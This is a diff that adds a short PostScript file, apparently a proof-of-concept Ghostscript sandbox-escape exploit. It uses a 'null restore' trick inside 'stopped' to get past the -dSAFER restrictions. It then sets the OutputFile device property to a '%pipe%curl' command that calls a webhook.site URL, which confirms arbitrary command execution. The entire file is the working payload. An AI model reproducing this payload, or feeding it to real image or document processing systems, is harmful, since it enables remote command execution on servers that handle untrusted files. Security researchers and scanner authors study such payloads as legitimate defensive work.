@@ -1,0 +1,6 @@
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%curl https://webhook.site/b5e60082-cf74-4aef-8560-d7ec345da2b5/?a=callback) currentdevice putdeviceprops
